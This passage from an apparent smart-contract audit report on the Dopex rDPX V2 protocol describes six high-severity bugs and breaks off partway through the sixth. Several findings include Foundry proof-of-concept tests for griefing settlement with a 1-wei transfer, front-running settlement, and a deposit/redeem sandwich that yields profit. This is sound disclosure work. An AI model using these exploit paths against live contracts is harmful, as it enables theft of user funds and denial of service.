[H-01] Improper precision of strike price calculation can result in broken protocol
Submitted byToshii, also found byMatin,Qeew,visualbits,crunch,circlelooper,qpzm,Jiamin,pep7siup,Juntao,0xmystery,eeshenggoh, lsaudit (1,2),peakbolt,0xDING99YA,Cosine,Topmark,0x3b,deadrxsezzz,piyushshukla, andcatwhiskeys
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1189-L1190
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583
Due to a lack of adequate precision, the calculated strike price for a PUT option for rDPX is not guaranteed to be 25% OTM, which breaks core assumptions around (1) protecting downside price movement of the rDPX which makes up part of the collateral for dpxETH & (2) not overpaying for PUT option protection.
More specifically, the price of rDPX as used in thecalculateBondCostfunction of the RdpxV2Core contract is represented as ETH / rDPX, and is given in 8 decimals of precision. To calculate the strike price which is 25% OTM based on the current price, the logic calls theroundUpfunction on what is effectively 75% of the current spot rDPX price. The issue is with theroundUpfunction of the PerpetualAtlanticVault contract, which effectively imposes a minimum value of 1e6.
Considering approximate recent market prices of$2000/ETH and$20/rDPX, the current price of rDPX in 8 decimals of precision would be exactly 1e6. Then to calculate the 25% OTM strike price, we would arrive at a strike price of1e6 * 0.75 = 75e4. TheroundUpfunction will then round up this value to1e6as the strike price, and issue the PUT option using that invalid strike price. Obviously this strike price is not 25% OTM, and since its an ITM option, the premium imposed will be significantly higher. Additionally this does not match the implementation as outlined in the docs.
Proof of Concept
When a user calls thebondfunction of the RdpxV2Core contract, it will calculate therdpxRequiredandwethRequiredrequired by the user in order to mint a specific_amountof dpxETH, which is calculated using thecalculateBondCostfunction:
functionbond(uint256_amount,uint256rdpxBondId,address_to)publicreturns(uint256receiptTokenAmount) {_whenNotPaused();// Validate amount_validate(_amount>0,4);// Compute the bond cost(uint256rdpxRequired,uint256wethRequired) =calculateBondCost(_amount,rdpxBondId);...}
Along with the collateral requirements, thewethRequiredwill also include the ETH premium required to mint the PUT option. The amount of premium is calculated based on a strike price which represents 75% of the current price of rDPX (25% OTM PUT option). In thecalculateBondCostfunction:
functioncalculateBondCost(uint256_amount,uint256_rdpxBondId)publicviewreturns(uint256rdpxRequired,uint256wethRequired) {uint256rdpxPrice=getRdpxPrice();...uint256strike=IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).roundUp(rdpxPrice- (rdpxPrice/4));// 25% below the current priceuint256timeToExpiry=IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).nextFundingPaymentTimestamp() -block.timestamp;if(putOptionsRequired) {wethRequired+=IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).calculatePremium(strike,rdpxRequired,timeToExpiry,0);}}
As shown, the strike price is calculated as:
uint256strike=IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).roundUp(rdpxPrice- (rdpxPrice/4));
It uses theroundUpfunction of the PerpetualAtlanticVault contract which is defined as follows:
functionroundUp(uint256_strike)publicviewreturns(uint256strike) {uint256remainder=_strike%roundingPrecision;if(remainder==0) {return_strike;}else{return_strike-remainder+roundingPrecision;}}
In this contractroundingPrecisionis set to1e6, and this is where the problem arises. As I mentioned earlier, take the following approximate market prices:$2000/ETH and$20/rDPX. This means therdpxPrice, which is represented as ETH/rDPX in 8 decimals of precision, will be1e6. To calculate the strike price, we get the following:1e6 * 0.75 = 75e4. However this value is fed into theroundUpfunction which will convert the75e4to1e6. This value of1e6is then used to calculate the premium, which is completely wrong. Not only is1e6not 25% OTM, but it is actually ITM, meaning the premium will be significantly higher than was intended by the protocol design.
Recommended Mitigation Steps
The value of theroundingPrecisionis too high considering reasonable market prices of ETH and rDPX. Consider decreasing it.
psytama (Dopex) confirmed

[H-02] Put settlement can be anticipated and lead to user losses and bonding DoS
Submitted byLokiThe5th, also found by__141345__,peakbolt,rvierdiiev,Nikki,mahdikarimi, andwintermute
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175
The liquidity providers depositWETHinto thePerpetualAtlanticVaultLPwhich in turn provides the required collateral for put options writing. Writing puts locks collateral and to write more puts excess collateral is needed. Once a put isin the moneyit can be exercised by theRdpxCoreV2contract, which forces the liquidity providers to take onrdpxat above market prices (i.e. they take a loss).
The issue is that liquidity providers to thePerpetualAtlanticVaultLPcan anticipate when they might take losses. Users may then take the precautionary action to avoid losses by exiting the LP prior to put settlements. By doing this, the users who are not as fast, or as technically sophisticated, are forced to take on more losses (as losses are then spread among less LPs).
Importantly, this is not dependent on MEV and will also happen on chains where MEV is not possible.
This issue has two root causes:
The price-threshold for settlement is knownPerpetualAtlanticVaultLPallows redemptions at any time as long as there is excess collateral available
This has a second order effect: by having the ability to anticipate when settlements will happen, if any puts are in the money, there is likely to be redemptions from thePerpetualAtlanticVaultLPwhich will drain all the available collateral. If all the available collateral is drained from the vault, then other users will not be able to bond using theRdpxV2Corecontracts, as calls topurchasewillrevertdue to insufficient collateral in the put options vault.
The issue has been classified as high for the following reasons:
The depositors who are either too slow, or are not as technically sophisticated, are forced to take more of the losses related to settlement of put options (as losses are spread among less participants).The token economic incentive is to anticipate calls tosettleand avoid taking losses, anddepositagain thereafter. Thiswillcreate market-related periods of insufficient collateral, leading to regular (albeit temporary) DoS of the bonding mechanism which can impact theETHpeg of theDpxEthToken(not to mention the poor optics for the project).
Proof of Concept
As the price-threshold for settlement is known, depositors into thePerpetualAtlanticVaultLPhave a few options to avoid this loss:
Users can simply monitor therdpxPriceInEthand, once the price is close to the strike price, remove their liquidity throughredeem(). They can then deposit after settlement to take up a greater number of shares.Users can monitor the mempool (may be an issue in later versions of Arbitrum or other chains) for calls toPerpetualAtlanticVault::settle()and front-run this with a call toredeemto avoid losses.Assettle()is a manual call from the Dopex multisig, this may take the form of a weekly process. Users may come to anticipate this and pull the available assets from the LP at those regular intervals.
Regardless of the method, the end result is the same.
The below coded PoC demonstrates the issue. One of the users, Bob (address(1)), anticipates a call tosettle()- either through front-running or a market-related decision. Bob then enters and exits the pool right before and after thesettlecall. Dave (address(2)), who is another liquidity provider, does not anticipate thesettle()call. We note the differences in PnL this creates in the console output.
Note: The PoC was created using theperp-vault/Integration.t.solfile, and should be placed in thetests/perp-vaultdirectory in a.solfile. The PoC can then be run withforge test --match-test testPoCHigh3 -vvv
Apologies for the extended setup code at the start, this is needed for an accurate test, the PoC start point is marked clearly.
// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.19;import { Test } from "forge-std/Test.sol";import "forge-std/console.sol";import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";import { Setup } from "./Setup.t.sol";import { PerpetualAtlanticVault } from "contracts/perp-vault/PerpetualAtlanticVault.sol";contract PoC is ERC721Holder, Setup {// ================================ HELPERS ================================ //function mintWeth(uint256 _amount, address _to) public {weth.mint(_to, _amount);}function mintRdpx(uint256 _amount, address _to) public {rdpx.mint(_to, _amount);}function deposit(uint256 _amount, address _from) public {vm.startPrank(_from, _from);vaultLp.deposit(_amount, _from);vm.stopPrank();}function purchase(uint256 _amount, address _as) public returns (uint256 id) {vm.startPrank(_as, _as);(, id) = vault.purchase(_amount, _as);vm.stopPrank();}function setApprovals(address _as) public {vm.startPrank(_as, _as);rdpx.approve(address(vault), type(uint256).max);rdpx.approve(address(vaultLp), type(uint256).max);weth.approve(address(vault), type(uint256).max);weth.approve(address(vaultLp), type(uint256).max);vm.stopPrank();}// ================================ CORE ================================ ///**Assumptions & config:- address(this) is impersonating the rdpxV2Core contract- premium per option: 0.05 weth- epoch duration: 1 day; 86400 seconds- initial price of rdpx: 0.2 weth- pricing precision is in 0.1 gwei- premium precision is in 0.1 gwei- rdpx and weth denomination in wei**/function testPoCHigh3() external {// Setup starts here ----------------------------->setApprovals(address(1));setApprovals(address(2));setApprovals(address(3));mintWeth(5 ether, address(1));mintWeth(5 ether, address(2));mintWeth(25 ether, address(3));/// The users depositdeposit(5 ether, address(1));deposit(5 ether, address(2));deposit(25 ether, address(3));uint256 userBalance = vaultLp.balanceOf(address(1));assertEq(userBalance, 5 ether);userBalance = vaultLp.balanceOf(address(2));assertEq(userBalance, 5 ether);userBalance = vaultLp.balanceOf(address(3));assertEq(userBalance, 25 ether);// premium = 100 * 0.05 weth = 5 wethuint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activatedskip(86500); // expires epoch 1vault.updateFunding();vault.updateFundingPaymentPointer();uint256[] memory strikes = new uint256[](1);strikes[0] = 0.015 gwei;uint256 fundingAccrued = vault.calculateFunding(strikes);assertEq(fundingAccrued, 5 ether);uint256[] memory tokenIds = new uint256[](1);tokenIds[0] = tokenId;/// ---------------- POC STARTS HERE ---------------------------------------------------///// At this point the Core contract has purchased options to sell 100 rdpx tokens// The market moves against `rdpx` and the puts are now in the moneypriceOracle.updateRdpxPrice(0.010 gwei);// Bob, a savvy user, sees there is collateral available to withdraw, and// because he monitors the price he knows the vault is about to take a loss// thus, he withdraws his capital, expecting a call to settle.userBalance = vaultLp.balanceOf(address(1));vm.startPrank(address(1));vaultLp.redeem(userBalance, address(1), address(1));vm.stopPrank();vm.startPrank(address(this), address(this));(uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);vm.stopPrank();// Bob now re-enters the LP Vaultvm.startPrank(address(1));vaultLp.deposit(weth.balanceOf(address(1)), address(1));vm.stopPrank();// Now we tally up the scoresconsole.log("User Bob ends with (WETH, RDPX, Shares):");userBalance = vaultLp.balanceOf(address(1));(uint256 aBob, uint256 bBob) = vaultLp.redeemPreview(userBalance);console.log(aBob, bBob, userBalance);userBalance = vaultLp.balanceOf(address(2));(uint256 aDave, uint256 bDave) = vaultLp.redeemPreview(userBalance);console.log("User Dave ends with (WETH, RDPX, Shares):");console.log(aDave, bDave, userBalance);/**Bob and Dave both started with 5 ether deposited into the vault LP.Bob ends up with shares worth 4.08 WETH + 16.32 RDPXDave ends up with shares worth 3.48 WETH + 13.94 RDPXThus we can conclude that by anticipating calls to `settle`,either by monitoring the market or through front-running,Bob has forced Dave to take on more of the losses.*/}}
The result is that even though Bob and Dave both started with 5 WETH deposited, by anticipating the call tosettle(), Bob was able to force Dave to take more of the losses while Bob was able to reenter and gain more shares than he started with. He has twisted the knife, so to speak.
Importantly, because the economic incentive is to exit and enter the pool in this way, it is likely to create a race condition where all the available collateral becomes withdrawn the moment the puts are in the money, meaning no user can bond (as options purchasing will revertdue to this check). This leads to temporary DoS of the bonding mechanism, until either the team takes direct action (settingputsRequiredtofalse) or new deposits come back into the vault
Tools Used
Foundry.
Recommended Mitigation Steps
One option would be to rework the deposits to allow a “cooling off period” after deposits, meaning that assets can’t be withdrawn until a set date in the future.
Another option would be to mint more shares to the vault itself in response to calls tosettle()which accrue to users. These shares can then be distributed to the users as they redeem based on their time in the vault (in effect rewarding the hodlers).
This is not a trivial change, as it will impact the token economics of the project.
psytama (Dopex) confirmed
Alex the Entreprenerd (Judge) commented:
I’m understanding that LPs are able to indeed able to redeem up tototalAvailableCollateral.For this reason, I agree with the validity of the finding.Conflicted on severity as total loss is capped, however, am thinking High is correct because new depositors are effectively guaranteed a loss, and there seems to be no rational way to avoid this scenario.

[H-03] The settle feature will be broken if attacker arbitrarily transfer collateral tokens to the PerpetualAtlanticVaultLP
Submitted byklau5, also found byKrisApostolov,Toshii,0xc0ffEE,codegpt,clash,ge6a,QiuhaoLi,parsely,Tendency,wintermute,bin2chen,Blockian,__141345__,Evo,0xbranded,visualbits,Udsen,0xvj,nirlin,ak1,jasonxiale,pontifex,Aymen0909,DanielArmstrong,AkshaySrivastav,savi0ur,RED-LOTUS-REACH,crunch,sces60107,pks_, Mike_Bello90 (1,2),tnquanghuy0512,circlelooper,ubermensch,asui,oakcobalt,bart1e, Anirruth (1,2),0xklh,blutorque,Baki,Snow24,Yanchuan,Jiamin,SBSecurity,kutugu,LokiThe5th,Juntao,nobody2018,juancito,carrotsmuggler,ladboy233,mert_eren,BugzyVonBuggernaut,GangsOfBrahmin,said,rokinot,ayden,0xDING99YA,lanrebayode77,peakbolt,chainsnake,T1MOH,Inspex,gjaldon,SpicyMeatball,LFGSecurity,ke1caM,Norah,auditsea,dirk_y,max10afternoon,tapir,spidy730,HChang26,grearlake,0xCiphky,chaduke,volodya,sl1,0x3b,Nyx,kodyvim,ravikiranweb3,ABA,0xWaitress,0xsurena,rvierdiiev,degensec,Kow,Krace,mahdikarimi, andsh1v
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359-L361
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L772-L774
RdpxV2Core.settlereverts and the protocol stops.
Proof of Concept
If a collateral token(WETH) is arbitrarily sent to PerpetualAtlanticVaultLP, the values ofcollateral.balanceOf(address(this))and_totalCollateralwill be different.
SincePerpetualAtlanticVaultLP.subtractLossrequires thatcollateral.balanceOf(address(this))exactly match with_totalCollateral - loss,PerpetualAtlanticVaultLP.subtractLosswill be failed if an attacker arbitrarily transfers collateral tokens to the PerpetualAtlanticVaultLP contract.
functionsubtractLoss(uint256loss)publiconlyPerpVault{require(collateral.balanceOf(address(this)) ==_totalCollateral-loss,"Not enough collateral was sent out");_totalCollateral-=loss;}
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205
Since there is no function that synchronizes_totalCollateralwithcollateral.balanceOf(address(this))without moving tokens, even admin cannot fix.
This is exploit PoC. Add this test case attests/perp-vault/Unit.t.sol
functiontestSettlePoC()public{weth.mint(address(1),1ether);weth.mint(address(777),1ether);// give some tokens to attackerdeposit(1ether,address(1));vault.purchase(1ether,address(this));uint256[]memoryids=newuint256[](1);ids[0] =0;skip(86500);// expirepriceOracle.updateRdpxPrice(0.010gwei);// ITMuint256wethBalanceBefore=weth.balanceOf(address(this));uint256rdpxBalanceBefore=rdpx.balanceOf(address(this));// attackvm.startPrank(address(777),address(777));weth.transfer(address(vaultLp),1);// send 1 wei of collateralvm.stopPrank();vm.expectRevert("Not enough collateral was sent out");vault.settle(ids);}
Recommended Mitigation Steps
Use>=instead of==atPerpetualAtlanticVaultLP.subtractLoss
function subtractLoss(uint256 loss) public onlyPerpVault {require(-   collateral.balanceOf(address(this)) == _totalCollateral - loss,+   collateral.balanceOf(address(this)) >= _totalCollateral - loss,"Not enough collateral was sent out");_totalCollateral -= loss;}
psytama (Dopex) confirmed via duplicate issue 619

[H-04]UniV3LiquidityAMO::recoverERC721will causeERC721tokens to be permanently locked inrdpxV2Core
Submitted bybart1e, also found byrokinot,gkrastenov,HHK,bin2chen,jasonxiale,Aymen0909,josephdara,pep7siup,peakbolt,Inspex,kodyvim,tapir,0x3b,0xCiphky,rvierdiiev, andchaduke
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L324-L334
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1-L1308
UniV3LiquidityAMO::recoverERC721is a function created in order to be able to recoverERC721tokens from theUniV3LiquidityAMOcontract. It can only be called by admin and will transfer allERC721tokens to theRdpxV2Corecontract. The problem is, that it won’t be possible to do anything with these tokens after they are transferred tordpxV2Core.
Indeed,RdpxV2Coreinherits from the following contracts:
AccessControl,ContractWhitelist,ERC721Holder,Pausable
and no contract from this list implement any logic allowing the NFT transfer (onlyERC721Holderhas something to do with NFTs, but it only allows to receive them, not to approve or transfer).
Moreover,rdpxV2Corealso doesn’t have any logic allowing transfer or approval of NFTs:
there is no genericexecutefunction thereno function implemented is related toERC721tokens (except foronERC721Receivedinherited fromERC721Holder)it may seem possible to do a dirty hack and try to useapproveContractToSpendin order to approveERC721token. Theoretically, one would have to specifyERC721tokenIdinstead ofERC20token amount, so thatIERC20WithBurn(_token).approve(_spender, _amount);in fact approvesERC721token withtokenId == _amount, but it fails with[FAIL. Reason: EvmError: Revert]and even if it didn’t, it still wouldn’t be possible to transferERC721token withtokenId == 0since there is_validate(_amount > 0, 17);insideapproveContractToSpend
Impact
UniV3LiquidityAMO::recoverERC721instead of recoveringERC721, locks all tokens inrdpxV2Coreand it won’t be possible to recover them from that contract.
Any use ofrecoverERC721will imply an irrecoverable loss for the protocoland this function was implemented in order to be used at some point after all (even if only on emergency situations). Because of that, I’m submitting this issue as High.
Proof of Concept
This PoC only shows thatERC721token recovery will not be possible by callingRdpxV2Core::approveContractToSpend. Lack of functions doingtransferorapproveor any otherERC721related functions inRdpxV2Coremay just be observed by looking at the contract’s code.
Please create theMockERC721.solfile inmocksdirectory and with the following code:
pragmasolidity^0.8.19;import"@openzeppelin/contracts/token/ERC721/ERC721.sol";contractMockERC721isERC721{constructor()ERC721("...","..."){}functiongiveNFT()public{_mint(msg.sender,1);}}
It will just mint anERC721token withtokenId = 1.
Please also run the following test:
functiontestNFT()public{// needed `import "../../contracts/mocks/MockERC721.sol";` at the beginning of the fileMockERC721mockERC721=newMockERC721();mockERC721.giveNFT();mockERC721.transferFrom(address(this),address(rdpxV2Core),1);// approveContractToSpend won't be possible to usevm.expectRevert();rdpxV2Core.approveContractToSpend(address(mockERC721),address(this),1);}
Tools Used
VS Code
Recommended Mitigation Steps
Either implement additionalERC721recovery function inRdpxV2Coreor changeUniV3LiquidityAMO::recoverERC721so that it transfers all NFTs tomsg.senderinstead ofRdpxV2Corecontract.
psytama (Dopex) confirmed and commented:
Change recover ERC721 function in uni v3 AMO.
Alex the Entreprenerd (Judge) commented:
The Warden has shown an incorrect hardcoded address in therecoverERC721if used it would cause an irrevocable loss of fundsTechnically speaking the Sponsor could useexecuteas a replacement, however the default function causes a loss so I’m inclined to agree with High Severity

[H-05] Users can get immediate profit when deposit and redeem inPerpetualAtlanticVaultLP
Submitted bysaid, also found by0xkazim, glcanvas (1,2),Toshii,KrisApostolov,HHK,Tendency,Evo,bin2chen,bart1e, peakbolt (1,2,3), AkshaySrivastav (1,2),0Kage,sces60107,qpzm,ubermensch,mahdikarimi, 836541 (1,2),Neon2835,nobody2018,carrotsmuggler,lanrebayode77,tapir,volodya,gjaldon, 0xCiphky (1,2),HChang26,max10afternoon, rvierdiiev (1,2),chaduke,QiuhaoLi,etherhood, andjosephdara
Due to wrong order betweenpreviewDepositandupdateFundinginsidePerpetualAtlanticVaultLP.deposit. In some case, user can get immediate profit when calldepositandredeemin the same block.
Proof of Concept
Whendepositis called, firstpreviewDepositwill be called to get thesharesbased onassetsprovided.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135
functiondeposit(uint256assets,addressreceiver)publicvirtualreturns(uint256shares) {// Check for rounding error since we round down in previewDeposit.>>>require((shares=previewDeposit(assets)) !=0,"ZERO_SHARES");>>>perpetualAtlanticVault.updateFunding();// Need to transfer before minting or ERC777s could reenter.collateral.transferFrom(msg.sender,address(this),assets);_mint(receiver,shares);_totalCollateral+=assets;emitDeposit(msg.sender,receiver,assets,shares);}
InsidepreviewDeposit, it will callconvertToSharesto calculate the shares.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L269-L271
functionpreviewDeposit(uint256assets)publicviewreturns(uint256) {returnconvertToShares(assets);}
convertToSharescalculate shares based on the providedassets,supplyandtotalVaultCollateral._totalCollateralis also part oftotalVaultCollateralthat will be used inside the calculation.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L274-L284
functionconvertToShares(uint256assets)publicviewreturns(uint256shares) {uint256supply=totalSupply;uint256rdpxPriceInAlphaToken=perpetualAtlanticVault.getUnderlyingPrice();uint256totalVaultCollateral=totalCollateral() +((_rdpxCollateral*rdpxPriceInAlphaToken) /1e8);returnsupply==0?assets:assets.mulDivDown(supply,totalVaultCollateral);}
After the shares calculation,perpetualAtlanticVault.updateFundingwill be called, this function will send collateral to vault LP if conditions are met and increase_totalCollateral.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524
functionupdateFunding()public{updateFundingPaymentPointer();uint256currentFundingRate=fundingRates[latestFundingPaymentPointer];uint256startTime=lastUpdateTime==0? (nextFundingPaymentTimestamp() -fundingDuration):lastUpdateTime;lastUpdateTime=block.timestamp;>>>collateralToken.safeTransfer(addresses.perpetualAtlanticVaultLP,(currentFundingRate* (block.timestamp-startTime)) /1e18);>>>IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds((currentFundingRate* (block.timestamp-startTime)) /1e18);emitFundingPaid(msg.sender,((currentFundingRate* (block.timestamp-startTime)) /1e18),latestFundingPaymentPointer);}
It means if_totalCollateralis increased, user can get immediate profit when they callredeem.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175
functionredeem(uint256shares,addressreceiver,addressowner)publicreturns(uint256assets,uint256rdpxAmount) {perpetualAtlanticVault.updateFunding();if(msg.sender!=owner) {uint256allowed=allowance[owner][msg.sender];// Saves gas for limited approvals.if(allowed!=type(uint256).max) {allowance[owner][msg.sender] =allowed-shares;}}>>> (assets,rdpxAmount) =redeemPreview(shares);// Check for rounding error since we round down in previewRedeem.require(assets!=0,"ZERO_ASSETS");_rdpxCollateral-=rdpxAmount;beforeWithdraw(assets,shares);_burn(owner,shares);collateral.transfer(receiver,assets);IERC20WithBurn(rdpx).safeTransfer(receiver,rdpxAmount);emitWithdraw(msg.sender,receiver,owner,assets,shares);}
WhenredeemPreviewis called and trigger_convertToAssets, it will used this newly increased_totalCollateral.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229
function_convertToAssets(uint256shares)internalviewvirtualreturns(uint256assets,uint256rdpxAmount) {uint256supply=totalSupply;return(supply==0)? (shares,0): (>>>shares.mulDivDown(totalCollateral(),supply),shares.mulDivDown(_rdpxCollateral,supply));}
This will open sandwich and MEV attack opportunity inside vault LP.
Foundry PoC :
Add this test toUnitcontract inside/tests/rdpxV2-core/Unit.t.sol, also addimport "forge-std/console.sol";in the contract :
functiontestSandwichProvideFunding()public{rdpxV2Core.bond(20*1e18,0,address(this));rdpxV2Core.bond(20*1e18,0,address(this));skip(86400*7);vault.addToContractWhitelist(address(rdpxV2Core));vault.updateFundingPaymentPointer();// test funding succesfullyuint256[]memorystrikes=newuint256[](1);strikes[0] =15e6;// calculate funding is done properlyvault.calculateFunding(strikes);uint256funding=vault.totalFundingForEpoch(vault.latestFundingPaymentPointer());// send funding to rdpxV2Core and call syncweth.transfer(address(rdpxV2Core),funding);rdpxV2Core.sync();rdpxV2Core.provideFunding();skip(86400*6);uint256balanceBefore=weth.balanceOf(address(this));console.log("balance of eth before deposit and redeem:");console.log(balanceBefore);weth.approve(address(vaultLp),type(uint256).max);uint256shares=vaultLp.deposit(1e18,address(this));vaultLp.redeem(shares,address(this),address(this));uint256balanceAfter=weth.balanceOf(address(this));console.log("balance after deposit and redeem:");console.log(balanceAfter);console.log("immediate profit :");console.log(balanceAfter-balanceBefore);}
Run the test :
forge test --match-contract Unit --match-test testSandwichProvideFunding -vvv
Log Output :
Logs:balance of eth before deposit and redeem:18665279470073000000000balance after deposit and redeem:18665299797412715619861immediate profit :20327339715619861
Recommended Mitigation Steps
MoveperpetualAtlanticVault.updateFundingbeforepreviewDepositis calculated.
function deposit(uint256 assets,address receiver) public virtual returns (uint256 shares) {+    perpetualAtlanticVault.updateFunding();// Check for rounding error since we round down in previewDeposit.require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");-    perpetualAtlanticVault.updateFunding();// Need to transfer before minting or ERC777s could reenter.collateral.transferFrom(msg.sender, address(this), assets);_mint(receiver, shares);_totalCollateral += assets;emit Deposit(msg.sender, receiver, assets, shares);}
witherblock (Dopex) disagreed with severity and commented:
Please bump this to high
Alex the Entreprenerd (Judge) increased severity to High

[H-06] Bond operations will always revert at certain time whenputOptionsRequiredis true
Submitted bysaid
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551
whenputOptionsRequiredistrue, there is period of time where bond operations will always revert when try to purchase options from perp atlantic vault.
Proof of Concept
Whenbondis called andputOptionsRequiredistrue, it will call_purchaseOptionsproviding the calculatedrdpxRequired.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L920-L922
functionbond(uint256_amount,uint256rdpxBondId,address_to)publicreturns(uint256receiptTokenAmount) {_whenNotPaused();// Validate amount_validate(_amount>0,4);// Compute the bond cost(uint256rdpxRequired,uint256wethRequired) =calculateBondCost(_amount,rdpxBondId);IERC20WithBurn(weth).safeTransferFrom(msg.sender,address(this),wethRequired);// update weth reservereserveAsset[reservesIndex["WETH"]].tokenBalance+=wethRequired;// purchase optionsuint256premium;if(putOptionsRequired) {>>>premium=_purchaseOptions(rdpxRequired);}_transfer(rdpxRequired,wethRequired-premium,_amount,rdpxBondId);// Stake the ETH in the ReceiptToken contractreceiptTokenAmount=_stake(_to,_amount);// reLPif(isReLPActive)IReLP(addresses.reLPContract).reLP(_amount);emitLogBond(rdpxRequired,wethRequired,receiptTokenAmount);}
Inside_purchaseOptions, it will callPerpetualAtlanticVault.purchaseproviding the amount andaddress(this)as receiver :
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L471-L487
function_purchaseOptions(uint256_amount)internalreturns(uint256premium) {/*** Purchase options and store ERC721 option id* Note that the amount of options purchased is the amount of rDPX received* from the user to sufficiently collateralize the underlying DpxEth stored in the bond**/uint256optionId;>>> (premium,optionId) =IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).purchase(_amount,address(this));optionsOwned[optionId] =true;reserveAsset[reservesIndex["WETH"]].tokenBalance-=premium;}
Then insidepurchase, it will calculatepremiumusingcalculatePremiumfunction, providingstrike,amount,timeToExpiry.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286
functionpurchase(uint256amount,addressto)externalnonReentrantonlyRole(RDPXV2CORE_ROLE)returns(uint256premium,uint256tokenId){_whenNotPaused();_validate(amount>0,2);updateFunding();uint256currentPrice=getUnderlyingPrice();// price of underlying wrt collateralTokenuint256strike=roundUp(currentPrice- (currentPrice/4));// 25% below the current priceIPerpetualAtlanticVaultLPperpetualAtlanticVaultLp=IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP);// Check if vault has enough collateral to write the optionsuint256requiredCollateral= (amount*strike) /1e8;_validate(requiredCollateral<=perpetualAtlanticVaultLp.totalAvailableCollateral(),3);uint256timeToExpiry=nextFundingPaymentTimestamp() -block.timestamp;// Get total premium for all options being purchased>>>premium=calculatePremium(strike,amount,timeToExpiry,0);// ... rest of operations}
Inside thiscalculatePremium, it will get price from option pricing :
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551
functioncalculatePremium(uint256_strike,uint256_amount,uint256timeToExpiry,uint256_price)publicviewreturns(uint256premium) {premium= ((IOptionPricing(addresses.optionPricing).getOptionPrice(_strike,_price>0?_price:getUnderlyingPrice(),getVolatility(_strike),timeToExpiry) *_amount) /1e8);}
The providedOptionPricingSimple.getOptionPricewill use Black-Scholes model to calculate the price :
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/BlackScholes.sol#L33-L89
